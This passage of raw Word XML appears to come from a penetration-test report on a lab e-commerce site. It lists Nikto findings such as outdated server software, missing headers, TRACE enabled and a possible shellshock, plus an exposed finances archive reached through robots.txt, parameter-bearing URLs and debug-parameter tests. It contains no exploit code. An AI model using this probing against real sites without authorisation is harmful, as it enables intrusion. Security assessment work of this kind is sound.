      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>PHP version: PHP/5.4.7</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29EFDA69" w14:textId="5D472256" w:rsidR="007317CE" w:rsidRDefault="007317CE" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="007317CE">
        <w:t>The anti-clickjacking X-Frame-Options header is not present.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="719AC549" w14:textId="77777777" w:rsidR="007317CE" w:rsidRDefault="007317CE" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="007317CE">
        <w:t>The X-XSS-Protection header is not defined.</w:t>
      </w:r>
      <w:r w:rsidR="00BF148D">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="598F64E0" w14:textId="77777777" w:rsidR="00BF148D" w:rsidRDefault="00BF148D" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00BF148D">
        <w:t>The X-Content-Type-Options header is not set.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D1DB9D1" w14:textId="77777777" w:rsidR="00BF148D" w:rsidRDefault="00BF148D" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>S</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF148D">
        <w:t xml:space="preserve">erver leaks </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BF148D">
        <w:t>inodes</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BF148D">
        <w:t xml:space="preserve"> via </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BF148D">
        <w:t>ETags</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BF148D">
        <w:t>, header found with file /robots.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="286E7BF7" w14:textId="77777777" w:rsidR="00BF148D" w:rsidRDefault="00BF148D" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00BF148D">
        <w:t>Entry '/company-accounts/' in robots.txt returned a non-forbidden or redirect HTTP code (200)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31968215" w14:textId="77777777" w:rsidR="00BF148D" w:rsidRDefault="00BF148D" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00BF148D">
        <w:t>"robots.txt" contains 1 entry which should be manually viewed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="760920D0" w14:textId="77777777" w:rsidR="00BF148D" w:rsidRDefault="00BF148D" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00BF148D">
        <w:t>PHP/5.4.7 appears to be outdated (current is at least 5.6.9).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="573CCCD0" w14:textId="77777777" w:rsidR="00BF148D" w:rsidRDefault="00BF148D" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00BF148D">
        <w:t>Apache/2.4.3 appears to be outdated (current is at least Apache/2.4.12).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="528A2E23" w14:textId="77777777" w:rsidR="00BF148D" w:rsidRDefault="00BF148D" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00BF148D">
        <w:t>OpenSSL/1.0.1c appears to be outdated (current is at least 1.0.1j).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A18E81B" w14:textId="77777777" w:rsidR="00BF148D" w:rsidRDefault="00BF148D" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00BF148D">
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Apache </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BF148D">
        <w:t>mod_negotiation</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BF148D">
        <w:t xml:space="preserve"> is enabled with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BF148D">
        <w:t>MultiViews</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BF148D">
        <w:t>, which allows attackers to easily brute force file names.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="488D2328" w14:textId="77777777" w:rsidR="00BF148D" w:rsidRDefault="00BF148D" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00BF148D">
        <w:t>HTTP TRACE method is active, suggesting the host is vulnerable to XST</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05B90985" w14:textId="2BCDD169" w:rsidR="00213FA9" w:rsidRDefault="00BF148D" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00BF148D">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BF148D">
        <w:t>cgi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BF148D">
        <w:t>-bin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BF148D">
        <w:t>printenv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BF148D">
        <w:t>: Site appears vulnerable to 'shellshock'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26AEF375" w14:textId="77777777" w:rsidR="00213FA9" w:rsidRDefault="00213FA9" w:rsidP="003023A3"/>
    <w:p w14:paraId="20BE9590" w14:textId="4A676B6D" w:rsidR="00501E2B" w:rsidRDefault="005710C2" w:rsidP="003023A3">
      <w:r>
        <w:t xml:space="preserve">Along with the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Nikto</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> scan, the</w:t>
      </w:r>
      <w:r w:rsidR="00501E2B">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00F225E1">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00213FA9">
        <w:t>Phpinfo</w:t>
      </w:r>
      <w:r w:rsidR="00F225E1">
        <w:t>.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00213FA9">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00501E2B">
        <w:t xml:space="preserve">page </w:t>
      </w:r>
      <w:r w:rsidR="00213FA9">
        <w:t>display</w:t>
      </w:r>
      <w:r w:rsidR="00F225E1">
        <w:t xml:space="preserve">s a large amount of information about the version of </w:t>
      </w:r>
      <w:r w:rsidR="00552ED8">
        <w:t>PHP</w:t>
      </w:r>
      <w:r w:rsidR="00F225E1">
        <w:t xml:space="preserve"> running a</w:t>
      </w:r>
      <w:r w:rsidR="00501E2B">
        <w:t>nd the apache server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A7C88C8" w14:textId="3E704E26" w:rsidR="00501E2B" w:rsidRDefault="0081487D" w:rsidP="003023A3">
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Nikto</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> scan gives information on the apache server and </w:t>
      </w:r>
      <w:r w:rsidR="00552ED8">
        <w:t>PHP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> version in use, as well as several areas that vulnerabilities may be present. The </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>httponly</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> flag is not set which means that the c</w:t>
      </w:r>
      <w:r w:rsidR="00552ED8">
        <w:t xml:space="preserve">ookies can be manually modified, and because </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">there is no XSS-Protection header, </w:t>
      </w:r>
      <w:r w:rsidR="00552ED8">
        <w:t>there is a possibility for cross site scripting attacks to be present.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19E5FBF2" w14:textId="535E4794" w:rsidR="003A5547" w:rsidRDefault="003A5547" w:rsidP="003A5547">
      <w:r>
        <w:t xml:space="preserve">Contained within the /robots.txt page is a link called /company-accounts. If this link is followed, then a zipped folder can be downloaded called “finances.zip”. This folder contains a large amount of sensitive and confidential information. The file names </w:t>
      </w:r>
      <w:r w:rsidR="0081487D">
        <w:t>for this folder can be seen in F</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">igure </w:t>
      </w:r>
      <w:r w:rsidR="00552ED8">
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidR="006B260C">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6618C14C" w14:textId="77777777" w:rsidR="003A5547" w:rsidRDefault="003A5547" w:rsidP="003A5547">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="06340658" wp14:editId="3AE32BC5">
            <wp:extent cx="5943600" cy="8997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99795"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="43CF09C3" w14:textId="26A04828" w:rsidR="003A5547" w:rsidRPr="003A5547" w:rsidRDefault="003A5547" w:rsidP="003A5547">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3</w:t>
      </w:r>
      <w:r w:rsidR="00AE0968">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t>- robots.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="269847D6" w14:textId="77777777" w:rsidR="00501E2B" w:rsidRPr="002C38B4" w:rsidRDefault="00501E2B" w:rsidP="002C38B4">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="9" w:name="_Toc531104327"/>
      <w:r w:rsidRPr="002C38B4">
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Enumerate Identifier-Specified Functions</w:t>
      </w:r>
      <w:bookmarkEnd w:id="9"/>
    </w:p>
    <w:p w14:paraId="19D0B3AE" w14:textId="3047EBB6" w:rsidR="0027664F" w:rsidRDefault="0027664F" w:rsidP="0027664F">
      <w:r>
        <w:t xml:space="preserve">After examining all the URLs, </w:t>
      </w:r>
      <w:r w:rsidR="006D488C">
        <w:t>it was found that four contained information within</w:t>
      </w:r>
      <w:r w:rsidR="00A941B8">
        <w:t>. The four URLs that pass</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> information are:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5610D169" w14:textId="22228402" w:rsidR="0027664F" w:rsidRDefault="00EA689B" w:rsidP="0027664F">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId17" w:history="1">
        <w:r w:rsidR="0027664F" w:rsidRPr="00F20528">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>http://192.168.1.10/addendum.php?type=terms.php</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5B971F9A" w14:textId="28FEC33E" w:rsidR="0027664F" w:rsidRDefault="00EA689B" w:rsidP="0027664F">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId18" w:history="1">
        <w:r w:rsidR="0027664F" w:rsidRPr="00F20528">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>http://192.168.1.10/cart_update.php?emptycart=1&amp;return_url=aHR0cDovLzE5Mi4xNjguMS4xMC9wcm9kdWN0cy5waHA/Y29tbWFuZCZwcm9kdWN0aWQ</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="0027664F">
        <w:t>=</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02B03B2C" w14:textId="6A1B5811" w:rsidR="0027664F" w:rsidRDefault="00EA689B" w:rsidP="0027664F">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId19" w:history="1">
        <w:r w:rsidR="0027664F" w:rsidRPr="00F20528">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>http://192.168.1.10/profile.php?msg=Successfully%20updated%20-%20I%20think</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="0027664F" w:rsidRPr="0027664F">
        <w:t>!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="360E717F" w14:textId="1A0CBFBE" w:rsidR="00000FCE" w:rsidRDefault="00000FCE" w:rsidP="00000FCE">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00000FCE">
        <w:t>http://192.168.1.10/thankyou.php?id=Jamie</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="541357E6" w14:textId="1E31F2E7" w:rsidR="0027664F" w:rsidRDefault="0027664F" w:rsidP="0027664F">
      <w:r>
        <w:t xml:space="preserve">By modifying the first URL, the </w:t>
      </w:r>
      <w:r w:rsidR="00A941B8">
        <w:t xml:space="preserve">output on the terms and conditions </w:t>
      </w:r>
      <w:r>
        <w:t>page is</w:t>
      </w:r>
      <w:r w:rsidR="00A941B8">
        <w:t xml:space="preserve"> edited. The </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">section of the page </w:t>
      </w:r>
      <w:r w:rsidR="00A941B8">
        <w:t xml:space="preserve">that contains information on the terms and conditions </w:t>
      </w:r>
      <w:r>
        <w:t>is removed and remains blank. This is seen in Figures 4 and 5.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6359C940" w14:textId="77777777" w:rsidR="0027664F" w:rsidRDefault="0027664F" w:rsidP="0027664F">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="70548C84" wp14:editId="13EE0BF4">
            <wp:extent cx="5943600" cy="38703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70325"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="38C61FCE" w14:textId="4EB8256B" w:rsidR="0027664F" w:rsidRDefault="0027664F" w:rsidP="0027664F">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4</w:t>
      </w:r>
      <w:r w:rsidR="00AE0968">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - Terms and conditions unmodified</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75A050D6" w14:textId="77777777" w:rsidR="0027664F" w:rsidRDefault="0027664F" w:rsidP="0027664F">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="48BB8D66" wp14:editId="1C50CB76">
            <wp:extent cx="5943600" cy="30289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28950"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="55031185" w14:textId="71BE487A" w:rsidR="0027664F" w:rsidRDefault="0027664F" w:rsidP="0027664F">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5</w:t>
      </w:r>
      <w:r w:rsidR="00AE0968">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - Terms and conditions page modified</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F6B2E15" w14:textId="6944D96E" w:rsidR="00D24A94" w:rsidRDefault="00D24A94" w:rsidP="00D24A94">
      <w:r>
        <w:t xml:space="preserve">The second URL contains an encrypted URL, that could potentially be modified to redirect the user to another page. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11563345" w14:textId="74B43792" w:rsidR="00D24A94" w:rsidRDefault="00D24A94" w:rsidP="00D24A94">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>The third URL does not change any features on the page if the ‘</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>msg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">’ contents are modified. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40C4C22B" w14:textId="26278CDD" w:rsidR="00000FCE" w:rsidRPr="00D24A94" w:rsidRDefault="00000FCE" w:rsidP="00D24A94">
      <w:r>
        <w:t xml:space="preserve">The fourth </w:t>
      </w:r>
      <w:r w:rsidR="00A941B8">
        <w:t>URL displays user crafted input</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> taken from the ‘name’ section of the contact us page. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5340DE20" w14:textId="77777777" w:rsidR="00CA1A16" w:rsidRDefault="00CA1A16" w:rsidP="003023A3"/>
    <w:p w14:paraId="7A965C2B" w14:textId="77777777" w:rsidR="00CA1A16" w:rsidRDefault="00CA1A16" w:rsidP="00CA1A16">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="10" w:name="_Toc531104328"/>
      <w:r w:rsidRPr="00CA1A16">
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Test for Debug Parameters</w:t>
      </w:r>
      <w:bookmarkEnd w:id="10"/>
    </w:p>
    <w:p w14:paraId="755AE90F" w14:textId="5BA2AED9" w:rsidR="00CA1A16" w:rsidRDefault="00D853CD" w:rsidP="00CA1A16">
      <w:r>
        <w:t xml:space="preserve">During this phase, </w:t>
      </w:r>
      <w:r w:rsidR="00D24A94">
        <w:t>the login page was experimented with using</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> debug parameters. The objective of this was to see if </w:t>
      </w:r>
      <w:r w:rsidR="005710C2">
        <w:t>they</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> would change the </w:t>
      </w:r>
      <w:r w:rsidR="005710C2">
        <w:t>outcome of the request</w:t>
      </w:r>
      <w:r>
        <w:t>. Aft</w:t>
      </w:r>
      <w:r w:rsidR="00110545">
        <w:t>er adding in the ‘</w:t>
      </w:r>
      <w:r w:rsidR="00D24A94">
        <w:t>/</w:t>
      </w:r>
      <w:r w:rsidR="00110545">
        <w:t>debug=’</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> parameter to the URL</w:t>
      </w:r>
      <w:r w:rsidR="005710C2">
        <w:t xml:space="preserve"> of the login page</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and testing with </w:t>
      </w:r>
      <w:r w:rsidR="00110545">
        <w:t>the words ‘true’, ‘on’, ‘1’ and ‘</w:t>
      </w:r>
      <w:r>
        <w:t>yes</w:t>
      </w:r>
      <w:r w:rsidR="00110545">
        <w:t>’</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, it was found that these parameters </w:t>
      </w:r>
      <w:r w:rsidR="00D24A94">
        <w:t xml:space="preserve">removed the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00D24A94">
        <w:t>css</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00D24A94">
        <w:t xml:space="preserve"> and JavaScript on the page.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="000A4BB3">
        <w:t>This process was repea</w:t>
      </w:r>
      <w:r w:rsidR="00110545">
        <w:t>ted using the ‘</w:t>
      </w:r>
      <w:r w:rsidR="00D24A94">
        <w:t>/</w:t>
      </w:r>
      <w:r w:rsidR="00110545">
        <w:t>source=’</w:t>
      </w:r>
      <w:r w:rsidR="000A4BB3">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="00110545">
        <w:t>‘</w:t>
      </w:r>
      <w:r w:rsidR="00D24A94">
        <w:t>/</w:t>
      </w:r>
      <w:r w:rsidR="00110545">
        <w:t>test=’</w:t>
      </w:r>
      <w:r w:rsidR="00BB6F43">
        <w:t xml:space="preserve"> and “</w:t>
      </w:r>
      <w:r w:rsidR="00D24A94">
        <w:t>/</w:t>
      </w:r>
      <w:r w:rsidR="00BB6F43">
        <w:t xml:space="preserve">hide=” parameters. </w:t>
      </w:r>
      <w:r w:rsidR="005710C2">
        <w:t>The outcome of all the</w:t>
      </w:r>
      <w:r w:rsidR="00110545">
        <w:t xml:space="preserve"> new te</w:t>
      </w:r>
      <w:r w:rsidR="002D0A06">
        <w:t>sts was the same as the tests fo</w:t>
      </w:r>
      <w:r w:rsidR="00110545">
        <w:t>r the ‘/debug’ parameter.</w:t>
      </w:r>
      <w:r w:rsidR="005710C2">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B1AA9CE" w14:textId="0471C634" w:rsidR="003479DA" w:rsidRDefault="003479DA" w:rsidP="00CA1A16">
      <w:r>
        <w:t xml:space="preserve">This process was attempted on the admin index page, without logging in as the admin. The outcome was that the user was redirected to the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>index.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> home page instead. The user was unable to view any of the admin page. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BABE600" w14:textId="77777777" w:rsidR="009C6BC5" w:rsidRDefault="009C6BC5" w:rsidP="00CA1A16"/>
    <w:p w14:paraId="4CA36A16" w14:textId="77777777" w:rsidR="009C6BC5" w:rsidRDefault="009C6BC5" w:rsidP="009C6BC5">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="11" w:name="_Toc531104329"/>
      <w:r>
        <w:t>Analyze the Application</w:t>
      </w:r>
      <w:bookmarkEnd w:id="11"/>
    </w:p>
    <w:p w14:paraId="3429B0E6" w14:textId="77777777" w:rsidR="00D853CD" w:rsidRDefault="001C7CFF" w:rsidP="001C7CFF">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="12" w:name="_Toc531104330"/>
      <w:r>
        <w:t>Identify Functionality</w:t>
      </w:r>
      <w:bookmarkEnd w:id="12"/>
    </w:p>
    <w:p w14:paraId="3E743867" w14:textId="657D5193" w:rsidR="001C7CFF" w:rsidRDefault="00B42C6B" w:rsidP="001C7CFF">
      <w:r>
        <w:t>The sole purpose of the</w:t>
      </w:r>
      <w:r w:rsidR="001C7CFF">
        <w:t xml:space="preserve"> website is to allow members to go online and purchase </w:t>
      </w:r>
      <w:r>
        <w:t>electronic</w:t>
      </w:r>
      <w:r w:rsidR="001C7CFF">
        <w:t xml:space="preserve"> devices. This comes with the ability to </w:t>
      </w:r>
      <w:r w:rsidR="008722F8">
        <w:t xml:space="preserve">create an account </w:t>
      </w:r>
      <w:r w:rsidR="005710C2">
        <w:t>and</w:t>
      </w:r>
      <w:r w:rsidR="001C7CFF">
        <w:t xml:space="preserve"> change a limited </w:t>
      </w:r>
      <w:r w:rsidR="005710C2">
        <w:t>number</w:t>
      </w:r>
      <w:r w:rsidR="001C7CFF">
        <w:t xml:space="preserve"> of features on </w:t>
      </w:r>
      <w:r w:rsidR="00110545">
        <w:t>the</w:t>
      </w:r>
      <w:r w:rsidR="001C7CFF">
        <w:t xml:space="preserve"> account. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BA4A0E3" w14:textId="634EB11D" w:rsidR="001C7CFF" w:rsidRDefault="00A90821" w:rsidP="001C7CFF">
      <w:r>
        <w:t>The website handles user authentication by m</w:t>
      </w:r>
      <w:r w:rsidR="00B42C6B">
        <w:t>atching a username and password</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> against a username and pa</w:t>
      </w:r>
      <w:r w:rsidR="00B51A3E">
        <w:t>ssword held in a database. The username and password</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> are not encrypted and are sent to the server in </w:t>
      </w:r>
      <w:r w:rsidR="00B51A3E">
        <w:t>plain text.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45BCD34C" w14:textId="77777777" w:rsidR="001C7CFF" w:rsidRDefault="009B37ED" w:rsidP="009B37ED">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="13" w:name="_Toc531104331"/>
      <w:r>
        <w:t>Identify Data Entry Points</w:t>
      </w:r>
      <w:bookmarkEnd w:id="13"/>
    </w:p>
    <w:p w14:paraId="7802D23D" w14:textId="767756A4" w:rsidR="009B37ED" w:rsidRDefault="00782706" w:rsidP="009B37ED">
      <w:r>
        <w:t xml:space="preserve">The website has several different pages which allow for user </w:t>
      </w:r>
      <w:r w:rsidR="00897567">
        <w:t>crafted in</w:t>
      </w:r>
      <w:r w:rsidR="00B51A3E">
        <w:t>put</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. These </w:t>
      </w:r>
      <w:r w:rsidR="00897567">
        <w:t>pages are as follow</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F4860E1" w14:textId="77777777" w:rsidR="00782706" w:rsidRDefault="00897567" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>login.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
